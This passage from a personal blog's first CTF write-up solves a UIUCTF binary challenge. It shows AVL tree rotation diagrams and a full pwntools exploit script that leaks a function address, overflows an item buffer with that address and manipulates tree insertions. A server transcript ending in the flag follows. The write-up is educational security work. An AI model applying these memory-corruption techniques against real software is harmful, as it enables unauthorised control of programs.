</pre></td> </tr></tbody></table></code></pre></figure> <p>So the <code class="language-plaintext highlighter-rouge">left</code> section just keeps traversing down and printing the left children, while the <code class="language-plaintext highlighter-rouge">right</code> section does the opposite. Cool!</p> <p>Initially, the program inserts nodes with prices [10, 20, 30, 40, 50, 25] into the tree. Let’s run the program again, and use inputs [1, 2, 3, 4] for the prices, which are inserted after.</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr>
<td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td> <td class="code"><pre><span class="o">===</span><span class="n">Nook</span><span class="p">(</span><span class="n">TM</span><span class="p">)</span> <span class="n">Accounting</span> <span class="n">Very</span> <span class="n">Large</span> <span class="n">Software</span> <span class="n">V</span> <span class="mi">10</span><span class="p">.</span><span class="mi">49185</span><span class="p">.</span><span class="mi">2</span><span class="n">a</span><span class="o">===</span>
<span class="o">-=</span><span class="n">Left</span><span class="o">=-</span>
<span class="n">Raymond</span> <span class="n">Hush</span> <span class="err">$$</span><span class="o">:</span> <span class="mi">2</span>
<span class="n">Shrub</span> <span class="n">Trimming</span><span class="o">:</span> <span class="mi">1</span>
<span class="o">-=</span><span class="n">Right</span><span class="o">=-</span>
<span class="n">Tom</span> <span class="n">Nook</span> <span class="n">Shirts</span><span class="o">:</span> <span class="mi">30</span>
<span class="n">Airplane</span> <span class="n">Ticket</span><span class="o">:</span> <span class="mi">40</span>
<span class="n">ATM</span> <span class="n">Repairs</span><span class="o">:</span> <span class="mi">50</span>
</pre></td> </tr></tbody></table></code></pre></figure> <p>I then inserted the same nodes in order to <a href="https://visualgo.net/bn/bst" rel="external nofollow noopener" target="_blank">VisuAlgo</a> (click on the AVL tree button on the header), which is a great website created by Dr. Steven Halim for visualizing algorithms and data structures. By the way, if you are interested in competitive programming, I would highly recommend his book Competitive Programming 4 which was just released a few days ago on July 19. I found the 3rd edition of the book invaluable when I did competitive programming in high school, and the knowledge basically tided me through most of the algorithm classes in college. You can find more information about his book <a href="https://cpbook.net/" rel="external nofollow noopener" target="_blank">here</a> (no, I am not receiving commission for this, nor was I asked to do this, I just really liked his book).</p> <figure> <picture> <source class="responsive-img-srcset" srcset=" /assets/img/screenshots/accounting_accident_avl_2.webp-480.webp 480w, /assets/img/screenshots/accounting_accident_avl_2.webp-800.webp 800w, /assets/img/screenshots/accounting_accident_avl_2.webp-1400.webp 1400w, " sizes="95vw" type="image/webp"></source> <img src="/assets/img/screenshots/accounting_accident_avl_2.webp" class="z-depth-1 center" width="400px" height="auto" style="object-fit: cover" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture><figcaption class="caption"> AVL tree after insertion </figcaption> </figure> <p>We see that the above picture has 2 and 1 when taking only left subtrees, and 30, 40, and 50 when only taking the right subtrees, just as what was being output by the binary. Nice!</p> <p>So now, our final challenge is to insert four nodes such that the node with our payload that has value 0x19=25 ends up at the root.</p> <p>The tree initially before any of our custom nodes are inserted looks like the following:</p> <figure> <picture> <source class="responsive-img-srcset" srcset=" /assets/img/screenshots/accounting_accident_avl_3.webp-480.webp 480w, /assets/img/screenshots/accounting_accident_avl_3.webp-800.webp 800w, /assets/img/screenshots/accounting_accident_avl_3.webp-1400.webp 1400w, " sizes="95vw" type="image/webp"></source> <img src="/assets/img/screenshots/accounting_accident_avl_3.webp" class="z-depth-1 center" width="400px" height="auto" style="object-fit: cover" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture><figcaption class="caption"> AVL tree before any nodes are inserted </figcaption> </figure> <p>For 25 to be the root, intuition tells us that we need to make the left part of the tree heavier and eventually force node 25 to bubble up. The way we’ll do this, however, is not so intuitive. We first want to force 25 to make a rotation upwards. This can be done by giving it more children. We insert nodes with values 26 and 27:</p> <figure> <picture> <source class="responsive-img-srcset" srcset=" /assets/img/screenshots/accounting_accident_avl_4.webp-480.webp 480w, /assets/img/screenshots/accounting_accident_avl_4.webp-800.webp 800w, /assets/img/screenshots/accounting_accident_avl_4.webp-1400.webp 1400w, " sizes="95vw" type="image/webp"></source> <img src="/assets/img/screenshots/accounting_accident_avl_4.webp" class="z-depth-1 center" width="400px" height="auto" style="object-fit: cover" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture><figcaption class="caption"> AVL tree after inserting 26 and 27 </figcaption> </figure> <p>“WHATTT?!”, I hear you say. Did we just make things worse, since node 25 is in an even lower position now?</p> <p>This is the unintuitive part, because what we were really doing is to give some nodes to the right subtree of 20. Now, we insert node 21, which forces the node at 20 to undergo a rotation:</p> <figure> <picture> <source class="responsive-img-srcset" srcset=" /assets/img/screenshots/accounting_accident_avl_5.webp-480.webp 480w, /assets/img/screenshots/accounting_accident_avl_5.webp-800.webp 800w, /assets/img/screenshots/accounting_accident_avl_5.webp-1400.webp 1400w, " sizes="95vw" type="image/webp"></source> <img src="/assets/img/screenshots/accounting_accident_avl_5.webp" class="z-depth-1 center" width="400px" height="auto" style="object-fit: cover" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture><figcaption class="caption"> AVL tree after inserting 21 </figcaption> </figure> <p>Now we have node 25 at a rather sweet spot. Finally, let’s cause a rotation at 30 by causing one of its child to increase in height. We can grow the height of the subtree rooted at 20 by either adding something less than 10, or something between 21 or 25. Let’s go with adding 22:</p> <figure> <picture> <source class="responsive-img-srcset" srcset=" /assets/img/screenshots/accounting_accident_avl_6.webp-480.webp 480w, /assets/img/screenshots/accounting_accident_avl_6.webp-800.webp 800w, /assets/img/screenshots/accounting_accident_avl_6.webp-1400.webp 1400w, " sizes="95vw" type="image/webp"></source> <img src="/assets/img/screenshots/accounting_accident_avl_6.webp" class="z-depth-1 center" width="400px" height="auto" style="object-fit: cover" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture><figcaption class="caption"> AVL tree after inserting 22 </figcaption> </figure> <p>We did it!</p> <h3 id="full-exploit">Full Exploit</h3> <p>The full exploit script is given below:</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr>
<td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
</pre></td> <td class="code"><pre><span class="cp">#!/usr/bin/env python3
</span><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./accounting"</span><span class="p">)</span>

<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="err">'</span><span class="n">kitty</span><span class="err">'</span><span class="p">,</span> <span class="err">'</span><span class="o">-</span><span class="n">e</span><span class="err">'</span><span class="p">,</span> <span class="err">'</span><span class="n">sh</span><span class="err">'</span><span class="p">,</span> <span class="err">'</span><span class="o">-</span><span class="n">c</span><span class="err">'</span><span class="p">]</span>

<span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="o">:</span>
    <span class="n">conn</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"chal.uiuc.tf"</span><span class="p">,</span> <span class="mi">2001</span><span class="p">)</span>
<span class="k">else</span><span class="o">:</span>
    <span class="n">conn</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">])</span>

<span class="n">def</span> <span class="n">main</span><span class="p">()</span><span class="o">:</span>
    <span class="cp"># Note that each of the recv steps can take a while to run,
</span>    <span class="cp"># because of the fancy printing. It is not frozen!
</span>    <span class="n">print</span><span class="p">(</span><span class="n">conn</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"{"</span><span class="p">))</span>
    <span class="n">leak</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"}"</span><span class="p">)[</span><span class="o">:-</span><span class="mi">1</span><span class="p">]</span>

    <span class="cp"># Leak print_flag address
</span>    <span class="n">flag_addr</span> <span class="o">=</span> <span class="kt">int</span><span class="p">(</span><span class="n">leak</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
    <span class="n">print</span><span class="p">(</span><span class="s">"print_flag address: "</span><span class="p">,</span> <span class="n">hex</span><span class="p">(</span><span class="n">flag_addr</span><span class="p">))</span>

    <span class="cp"># Overflow exploit
</span>    <span class="n">print</span><span class="p">(</span><span class="n">conn</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Item: "</span><span class="p">))</span>
    <span class="n">exp</span> <span class="o">=</span> <span class="n">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x10</span>
    <span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">flag_addr</span><span class="p">)</span>
    <span class="n">conn</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">exp</span><span class="p">)</span>

    <span class="cp"># First price input
</span>    <span class="n">print</span><span class="p">(</span><span class="n">conn</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Shrub Trimming Cost: "</span><span class="p">))</span>
    <span class="n">conn</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="err">'</span><span class="mi">26</span><span class="err">'</span><span class="p">)</span>

    <span class="cp"># Second price input
</span>    <span class="n">print</span><span class="p">(</span><span class="n">conn</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Raymond Hush $$ Cost: "</span><span class="p">))</span>
    <span class="n">conn</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="err">'</span><span class="mi">27</span><span class="err">'</span><span class="p">)</span>

    <span class="cp"># Third price input
</span>    <span class="n">print</span><span class="p">(</span><span class="n">conn</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Town Hall Food Cost: "</span><span class="p">))</span>
    <span class="n">conn</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="err">'</span><span class="mi">21</span><span class="err">'</span><span class="p">)</span>

    <span class="cp"># Last price input
</span>    <span class="n">print</span><span class="p">(</span><span class="n">conn</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"New Wall Art Cost: "</span><span class="p">))</span>
    <span class="n">conn</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="err">'</span><span class="mi">22</span><span class="err">'</span><span class="p">)</span>
    
    <span class="n">conn</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="o">:</span>
    <span class="n">main</span><span class="p">()</span>
</pre></td> </tr></tbody></table></code></pre></figure> <p>Running the exploit script against the challenge server:</p> <figure class="highlight"><pre><code class="language-text" data-lang="text">➜  accounting python solve.py REMOTE
[+] Opening connection to chal.uiuc.tf on port 2001: Done
b'[NookAccounting]: Booting up Fancy Laser Accounting Generator (F.L.A.G.) at {'
print_flag address:  0x8048878
b'\n[NookAccounting]: Added "Apples" with cost of 10 bells to accounting spreadsheet.\n[NookAccounting]: Added "Fancy Seashells" with cost of 20 bells to accounting spreadsheet.\n[NookAccounting]: Added "Tom Nook Shirts" with cost of 30 bells to accounting spreadsheet.\n[NookAccounting]: Added "Airplane Ticket" with cost of 40 bells to accounting spreadsheet.\n[NookAccounting]: Added "ATM Repairs" with cost of 50 bells to accounting spreadsheet.\n[Isabelle]: Oh no! I cant seem to find what this item is, but it cost 25 bells, what is it?\nItem: '
b'[Isabelle]: Ohmygosh! Thank you for remembering! Now I can get back to work!\n[NookAccounting]: Added "AAAAAAAAAAAAAAA" with cost of 25 bells to accounting spreadsheet.\n\n[Isabelle]: Ohmyheck! I dont know how much "Shrub Trimming" costs. Can you tell me?\nShrub Trimming Cost: '
b'[NookAccounting]: Added "Shrub Trimming" with cost of 26 bells to accounting spreadsheet.\n\n\n[Isabelle]: Thank you so much! You\'re the best, I added it to the accounting system now\n[Isabelle]: Ohmyheck! I dont know how much "Raymond Hush $$" costs. Can you tell me?\nRaymond Hush $$ Cost: '
b'[NookAccounting]: Added "Raymond Hush $$" with cost of 27 bells to accounting spreadsheet.\n\n\n[Isabelle]: Thank you so much! You\'re the best, I added it to the accounting system now\n[Isabelle]: Ohmyheck! I dont know how much "Town Hall Food" costs. Can you tell me?\nTown Hall Food Cost: '
b'[NookAccounting]: Added "Town Hall Food" with cost of 21 bells to accounting spreadsheet.\n\n\n[Isabelle]: Thank you so much! You\'re the best, I added it to the accounting system now\n[Isabelle]: Ohmyheck! I dont know how much "New Wall Art" costs. Can you tell me?\nNew Wall Art Cost: '
[*] Switching to interactive mode
[NookAccounting]: Added "New Wall Art" with cost of 22 bells to accounting spreadsheet.


[Isabelle]: Thank you so much! You're the best, I added it to the accounting system now
[Isabelle]: Okay thank you so much! I'll run the accounting software at address 0x8048878
uiuctf{1s@beLl3_do3sNt_r3@l1y_d0_MuCh_!n_aCnH}</code></pre></figure> <p>And just like that we get our flag!</p> <h3 id="flavortext">Flavortext</h3> <figure class="highlight"><pre><code class="language-text" data-lang="text">Isabelle is working on billing sheets for the end of the month, and she needs to move things into her Accounting Very Large accounting system. Can you help her finish her billing?!</code></pre></figure> <h3 id="about-the-banner-picture">About The Banner Picture</h3> <p>This picture was taken during my hike up Mt. Tallac at Lake Tahoe last summer (2019). You can see a glimpse of the lake in the background. The hike was around 10 miles, with an elevation gain of around 3.3k ft.</p> <h3 id="closing">Closing</h3> <p>This is my first CTF writeup, and I tried to be as descriptive as possible and explain my thought process every step of the way. It look a lot longer than I expected to write it up, so I hope that it was helpful to you!</p> </div> </article> <br> <hr> <br> <ul class="list-disc pl-8"></ul> <p class="mb-2">Related Posts:</p> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2025/gaussian-processes/">An Intuitive Introduction to Gaussian Processes</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2025/bounding-markov-chain-mixing-times-by-spectral-gap/">Bounding Mixing Times of Markov Chains via the Spectral Gap</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2024/llama-3.1-technical-report-notes/">Notes on 'The Llama 3 Herd of Models'</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2023/setting-up-yuancon-controller-sound-voltex/">Playing Sound Voltex at Home: Setting Up Unnamed SDVX Clone with the Yuancon SDVX Controller</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2023/creating-trackback-requests/">Creating Trackback Requests for Static Sites</a> </li> <div id="giscus_thread" style="max-width: 930px; margin: 0 auto;"> <script>
      let giscusTheme = determineComputedTheme();
      let giscusAttributes = {
        src: 'https://giscus.app/client.js',
        'data-repo': 'fanpu/fanpu.github.io',
        'data-repo-id': '',
        'data-category': 'Comments',
        'data-category-id': '',
        'data-mapping': 'title',
        'data-strict': '1',
        'data-reactions-enabled': '1',
        'data-emit-metadata': '0',
        'data-input-position': 'bottom',
        'data-theme': giscusTheme,
        'data-lang': 'en',
        crossorigin: 'anonymous',
        async: '',
      };

      let giscusScript = document.createElement('script');
      Object.entries(giscusAttributes).forEach(([key, value]) => giscusScript.setAttribute(key, value));
      document.getElementById('giscus_thread').appendChild(giscusScript);
    </script> <noscript>Please enable JavaScript to view the <a href="http://giscus.app/?ref_noscript" rel="external nofollow noopener" target="_blank">comments powered by giscus.</a> </noscript> </div> </div> </div> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> © Copyright 2025 Fan Pu Zeng. Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Last updated: January 22, 2025. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js?a0db7e5d5c70cc3252b3138b0c91dcaf" type="text/javascript"></script> <script src="/assets/js/tooltips-setup.js?53023e960fbc64cccb90d32e9363de2b"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script defer src="/assets/js/bootstrap-toc.min.js?c82ff4de8b0955d6ff14f5b05eed7eb6"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?e0514a05c5c95ac1a93a8dfd5249b92e"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI=" crossorigin="anonymous"></script> <script src="/assets/js/mathjax-setup.js?5fdb75708acb79bd79b0cacb0ed0237d"></script> <script defer src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script async src="https://www.googletagmanager.com/gtag/js?id=G-S3VHEYH05S"></script> <script>
    window.dataLayer = window.dataLayer || [];
    function gtag() {
      dataLayer.push(arguments);
    }
    gtag('js', new Date());

    gtag('config', 'G-S3VHEYH05S');
  </script> <script defer src="/assets/js/progress-bar.js?2f30e0e6801ea8f5036fa66e1ab0a71a" type="text/javascript"></script> <script src="/assets/js/vanilla-back-to-top.min.js?f40d453793ff4f64e238e420181a1d17"></script> <script>
    addBackToTop();
  </script> <script type="module" src="/assets/js/search/ninja-keys.min.js?a3446f084dcaecc5f75aa1757d087dcf"></script> <ninja-keys hidebreadcrumbs noautoloadmdicons placeholder="Type to start searching"></ninja-keys> <script src="/assets/js/search-setup.js?6c304f7b1992d4b60f7a07956e52f04a"></script> <script src="/assets/js/search-data.js"></script> <script src="/assets/js/shortcut-key.js?6f508d74becd347268a7f822bca7309d"></script> </body> </html>